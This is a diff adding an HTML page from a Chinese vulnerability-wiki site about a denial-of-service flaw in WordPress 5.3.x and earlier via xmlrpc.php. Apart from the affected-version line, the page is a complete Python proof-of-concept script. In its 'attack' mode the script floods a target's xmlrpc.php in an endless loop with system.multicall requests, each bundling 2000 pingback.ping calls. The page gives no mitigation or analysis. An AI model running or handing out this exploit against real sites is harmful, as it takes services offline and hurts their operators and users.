@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/WordPress%20_%3D5.3.0%20xmlrpc.php%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>WordPress \&lt;=5.3.x xmlrpc.php拒绝服务漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "WordPress \\\u0026lt;=5.3.x xmlrpc.php\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Wordpress%205.2.4%20cors%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Wordpress%205.2.4%20cors%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Wordpress 5.2.4 cors跨域劫持漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2020-12462%EF%BC%89WordPress%20Plugin%20-%20Ninja%20Forms%20CSRF%20to%20XSS/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2020-12462%EF%BC%89WordPress%20Plugin%20-%20Ninja%20Forms%20CSRF%20to%20XSS/" class="btn btn-xs btn-link">
+        （CVE-2020-12462）WordPress Plugin - Ninja Forms CSRF to XSS
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="wordpress-53x-xmlrpcphp">WordPress \&lt;=5.3.x xmlrpc.php拒绝服务漏洞<a class="headerlink" href="#wordpress-53x-xmlrpcphp" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>WordPress \&lt;= 5.3</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>漏洞文件</p>
+<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">xmlrpc</span><span class="o">.</span><span class="n">php</span>
+<span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">xmlrpc</span><span class="o">.</span><span class="n">php</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urlparse</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span><span class="o">,</span><span class="w"> </span><span class="nn">uuid</span><span class="o">,</span><span class="w"> </span><span class="nn">urllib3</span><span class="o">,</span><span class="w"> </span><span class="nn">requests</span>
+<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+
+<span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">True</span> 
+<span class="k">def</span><span class="w"> </span><span class="nf">dprint</span><span class="p">(</span><span class="n">X</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="n">X</span><span class="p">)</span>
+
+<span class="n">COUNT</span><span class="o">=</span><span class="mi">0</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">build_entry</span><span class="p">(</span><span class="n">pingback</span><span class="p">,</span><span class="n">target</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">COUNT</span>
+    <span class="n">COUNT</span> <span class="o">+=</span><span class="mi">1</span>
+    <span class="n">entry</span>  <span class="o">=</span> <span class="s2">&quot;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;pingback.ping&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&quot;</span>
+    <span class="n">entry</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;</span><span class="si">{</span><span class="n">pingback</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">COUNT</span><span class="si">}</span><span class="s2">&lt;/value&gt;&quot;</span>
+    <span class="c1">#entry += f&quot;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;{pingback}/{uuid.uuid4()}&lt;/value&gt;&quot;</span>
+    <span class="n">entry</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;&lt;value&gt;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/?p=1&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&quot;</span>
+    <span class="c1">#entry += f&quot;&lt;value&gt;{target}/#e&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&quot; # taxes DB more</span>
+    <span class="k">return</span> <span class="n">entry</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">build_request</span><span class="p">(</span><span class="n">pingback</span><span class="p">,</span><span class="n">target</span><span class="p">,</span><span class="n">entries</span><span class="p">):</span>
+    <span class="n">prefix</span>   <span class="o">=</span> <span class="s2">&quot;&lt;methodCall&gt;&lt;methodName&gt;system.multicall&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;array&gt;&quot;</span>
+    <span class="n">suffix</span>   <span class="o">=</span> <span class="s2">&quot;&lt;/array&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&quot;</span>
+    <span class="n">request</span>  <span class="o">=</span> <span class="n">prefix</span>
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">entries</span><span class="p">):</span> <span class="n">request</span> <span class="o">+=</span> <span class="n">build_entry</span><span class="p">(</span><span class="n">pingback</span><span class="p">,</span><span class="n">target</span><span class="p">)</span>
+    <span class="n">request</span> <span class="o">+=</span> <span class="n">suffix</span>
+    <span class="k">return</span> <span class="n">request</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">usage_die</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[!] Usage: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> &lt;check/attack&gt; &lt;pingback url&gt; &lt;target url&gt;&quot;</span><span class="p">)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">get_args</span><span class="p">():</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span> <span class="n">usage_die</span><span class="p">()</span>
+    <span class="n">action</span>   <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">pingback</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">target</span>   <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+    <span class="k">if</span> <span class="n">action</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="s2">&quot;check&quot;</span><span class="p">,</span><span class="s2">&quot;attack&quot;</span><span class="p">):</span> <span class="n">usage_die</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">URL</span> <span class="ow">in</span> <span class="p">(</span><span class="n">pingback</span><span class="p">,</span><span class="n">target</span><span class="p">):</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="nb">all</span><span class="p">((</span><span class="n">res</span><span class="o">.</span><span class="n">scheme</span><span class="p">,</span><span class="n">res</span><span class="o">.</span><span class="n">netloc</span><span class="p">)):</span> <span class="n">usage_die</span><span class="p">()</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">action</span><span class="p">,</span><span class="n">pingback</span><span class="p">,</span><span class="n">target</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">action</span><span class="p">,</span><span class="n">pingback</span><span class="p">,</span><span class="n">target</span><span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[&gt;] WordPress &lt;= 5.3.? Denial-of-Service PoC&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[&gt;] @roddux 2019 | Arcturus Security | labs.arcturus.net&quot;</span><span class="p">)</span>
+    <span class="c1"># he checc</span>
+    <span class="k">if</span> <span class="n">action</span> <span class="o">==</span> <span class="s2">&quot;check&quot;</span><span class="p">:</span>    <span class="n">entries</span> <span class="o">=</span> <span class="mi">2</span>
+    <span class="c1"># he attacc</span>
+    <span class="k">elif</span> <span class="n">action</span> <span class="o">==</span> <span class="s2">&quot;attack&quot;</span><span class="p">:</span> <span class="n">entries</span> <span class="o">=</span> <span class="mi">2000</span>
+    <span class="c1"># but most importantly</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Running in </span><span class="si">{</span><span class="n">action</span><span class="si">}</span><span class="s2"> mode&quot;</span><span class="p">)</span>
+    <span class="c1"># he pingbacc</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Got pingback URL </span><span class="se">\&quot;</span><span class="si">{</span><span class="n">pingback</span><span class="si">}</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Got target URL </span><span class="se">\&quot;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Building </span><span class="si">{</span><span class="n">entries</span><span class="si">}</span><span class="s2"> pingback calls&quot;</span><span class="p">)</span>
+    <span class="c1"># entries = 1000 # TESTING</span>
+    <span class="n">xmldata</span> <span class="o">=</span> <span class="n">build_request</span><span class="p">(</span><span class="n">pingback</span><span class="p">,</span><span class="n">target</span><span class="p">,</span><span class="n">entries</span><span class="p">)</span>
+    <span class="n">dprint</span><span class="p">(</span><span class="s2">&quot;[+] Request:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">dprint</span><span class="p">(</span><span class="n">xmldata</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Request size: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">xmldata</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">action</span> <span class="o">==</span> <span class="s2">&quot;attack&quot;</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Starting attack loop, CTRL+C to stop...&quot;</span><span class="p">)</span>
+        <span class="n">rcount</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+                    <span class="k">try</span><span class="p">:</span>
+                        <span class="n">resp</span>  <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/xmlrpc.php&quot;</span><span class="p">,</span> <span class="n">xmldata</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">.2</span><span class="p">)</span>
+                        <span class="c1">#dprint(resp.content.decode(&quot;UTF-8&quot;)[0:500]+&quot;\n&quot;)</span>
+                        <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+                            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[!] Received odd status (</span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">) -- DoS successful?&quot;</span><span class="p">)</span>
+                    <span class="k">except</span> <span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">,</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">ConnectionError</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                        <span class="k">pass</span>
+                    <span class="n">rcount</span> <span class="o">+=</span> <span class="mi">1</span>
+                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\r</span><span class="s2">[+] Requests sent: </span><span class="si">{</span><span class="n">rcount</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[&gt;] Attack finished&quot;</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">action</span> <span class="o">==</span> <span class="s2">&quot;check&quot;</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Sending check request&quot;</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/xmlrpc.php&quot;</span><span class="p">,</span> <span class="n">xmldata</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[!] Received odd status (</span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">) -- check target url&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Request sent&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Response headers:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Response dump:&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;UTF-8&quot;</span><span class="p">))</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Here&#39;s the part where you figure out if it&#39;s vulnerable, because I CBA to code it&quot;</span><span class="p">)</span>
+        <span class="k">except</span> <span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">,</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">ConnectionError</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[!] Connection error&quot;</span><span class="p">)</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[&gt;] Check finished&quot;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">(</span><span class="o">*</span><span class="n">get_args</span><span class="p">()</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Wordpress%205.2.4%20cors%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Wordpress%205.2.4%20cors%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Wordpress 5.2.4 cors跨域劫持漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2020-12462%EF%BC%89WordPress%20Plugin%20-%20Ninja%20Forms%20CSRF%20to%20XSS/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2020-12462%EF%BC%89WordPress%20Plugin%20-%20Ninja%20Forms%20CSRF%20to%20XSS/" class="btn btn-xs btn-link">
+        （CVE-2020-12462）WordPress Plugin - Ninja Forms CSRF to XSS
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
